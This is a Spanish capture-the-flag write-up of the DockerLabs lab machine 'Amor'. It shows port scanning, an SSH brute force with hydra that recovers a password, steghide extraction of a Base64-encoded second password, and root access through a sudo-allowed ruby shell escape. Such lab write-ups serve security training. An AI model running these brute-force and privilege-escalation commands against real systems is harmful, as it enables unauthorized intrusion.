---
icon: linux
---

# Amor ​​

## 🖥️ Writeup - Amor

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Steganography` `Hydra` `Information Leakage` `Base64` `Sudoers` `Ruby`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip amor.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh amor.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 15:38 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
|_  256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: SecurSEC S.L
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
```

Tenemos abiertos los puertos `22` y `80`.

Accedemos por `HTTP` y, entre otras cosas, nos encontramos con el siguiente mensaje:

```
¡Importante! Despido de empleado

Juan fue despedido de la empresa por enviar un correo con la contraseña a un compañero.

Firmado: Carlota, Departamento de ciberseguridad
```

Podemos deducir que `carlota` es un usuario válido del sistema de la empresa, mientras que `juan` puede que ya no lo sea porque lo han despedido.

Como no encontramos nada haciendo `fuzzing` de directorios, intentamos un ataque de fuerza bruta sobre el puerto `SSH` con el usuario `carlota`.

## FUERZA BRUTA

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 60
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-13 15:44:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 60 tasks per 1 server, overall 60 tasks, 14344399 login tries (l:1/p:14344399), ~239074 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
```

Encontramos credenciales válidas para `carlota` : `babygirl`.

Accedemos por `SSH`.

```bash
ssh carlota@172.17.0.2
```

## ESCALDA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`.

Pero no encontramos ninguna vía de escalada.

Buscando entre los archivos de `carlota` encontramos una imagen que podría contener información adicional, así que la transferimos a nuestra máquina `Kali`.

```bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg .
```

Info:

```
carlota@172.17.0.2's password: 
imagen.jpg                                                            100%   51KB  29.6MB/s   00:00
```

Intentamos extraer información oculta de la imagen:

```bash
steghide extract -sf imagen.jpg 
```

Se nos pide una passphrase y la dejamos en blanco.

Info:

```
Enter passphrase: 
wrote extracted data to "secret.txt".
```

Conseguimos extraer información de la imagen, que ahora se encuentra en un archivo `secret.txt`.

```
ZXNsYWNhc2FkZXBpbnlwb24=
```

Al revisar su contenido obtenemos un string en `Base64`, que debemos decodificar.

```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
```

Info:

```
eslacasadepinypon
```

Probamos a utilizar esta posible contraseña para autenticarnos como el usuario `oscar`, que habíamos visto anteriormente en el archivo `/etc/passwd`.

```bash
su oscar
```

Introducimos la contraseña `eslacasadepinypon` y, efectivamente, conseguimos pivotar al usuario `oscar`.

Volvemos a comprobar permisos `sudo` y `SUID`.

```bash
sudo -l
```

Info:

```
Matching Defaults entries for oscar on 8deed0004059:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User oscar may run the following commands on 8deed0004059:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Verificamos que podemos ejecutar el binario `ruby` con privilegios de `root`, lo que aprovechamos para escalar privilegios de esta manera:

```bash
sudo ruby -e 'exec "/bin/sh"'
```

Info:

```
# whoami
root
# 
```

Ya somos root!
